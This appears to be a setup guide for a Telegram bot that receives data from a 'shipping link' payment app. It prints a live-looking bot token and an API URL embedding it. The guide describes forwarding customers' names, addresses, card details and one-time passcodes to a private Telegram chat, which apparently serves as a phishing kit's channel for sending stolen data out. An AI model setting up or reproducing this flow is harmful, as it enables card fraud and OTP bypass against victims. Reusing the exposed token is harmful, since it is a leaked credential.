# Telegram Bot Setup Guide

## Bot Information
- **Bot Token**: `8208871147:AAGaRBd64i-1jneToDRe6XJ8hYXdBNnBLl0`
- **Bot Username**: `@khlijapp_bot`
- **Bot Name**: `alkhalij`
- **Bot ID**: `8208871147` (This is NOT the chat ID to send messages to)

## How to Get Your Chat ID

### Method 1: Using the Bot
1. Start a conversation with the bot: [@khlijapp_bot](https://t.me/khlijapp_bot)
2. Send any message to the bot (e.g., "Hello")
3. Visit: `https://api.telegram.org/bot8208871147:AAGaRBd64i-1jneToDRe6XJ8hYXdBNnBLl0/getUpdates`
4. Look for the `chat.id` in the response - this is your chat ID

### Method 2: Using @userinfobot
1. Start a conversation with [@userinfobot](https://t.me/userinfobot)
2. Send any message
3. The bot will reply with your user ID

### Method 3: Using @getidsbot
1. Start a conversation with [@getidsbot](https://t.me/getidsbot)
2. Send any message
3. The bot will reply with your user ID

## Update Configuration

Once you have your chat ID, update the `CHAT_ID` in `/src/lib/telegram.ts`:

```typescript
const CHAT_ID = 'YOUR_CHAT_ID_HERE'; // Replace with your actual chat ID
```

## Testing the Integration

1. **Test Connection**: Use the test component on the shipping link creation page
2. **Test Data Flow**: Create a shipping link and check if data is sent to Telegram
3. **Verify Messages**: Check your Telegram chat for the formatted messages

## Message Types

The bot sends different types of messages:

1. **Shipping Link Created** (`shipping_link_created`)
   - Tracking number
   - Service name
   - Package details
   - Payment amount
   - Country
   - Payment URL

2. **Payment Recipient** (`payment_recipient`)
   - Customer details
   - Contact information
   - Address
   - Service and amount

3. **Card Details** (`card_details`)
   - Cardholder name
   - Last 4 digits
   - Expiry date
   - Service information

4. **Payment Confirmation** (`payment_confirmation`)
   - Complete payment details
   - OTP verification
   - Final confirmation

## Troubleshooting

### Bot Can't Send Messages
- **Error**: "Forbidden: bots can't send messages to bots"
- **Solution**: Use a user chat ID, not a bot ID

### Bot Not Responding
- **Check**: Bot token is correct
- **Check**: Chat ID is correct
- **Check**: Bot is started (send /start to the bot)

### Messages Not Formatted
- **Check**: HTML parsing is enabled
- **Check**: Message format is correct

## Security Notes

- Keep your bot token secure
- Don't share your chat ID publicly
- Consider using environment variables for production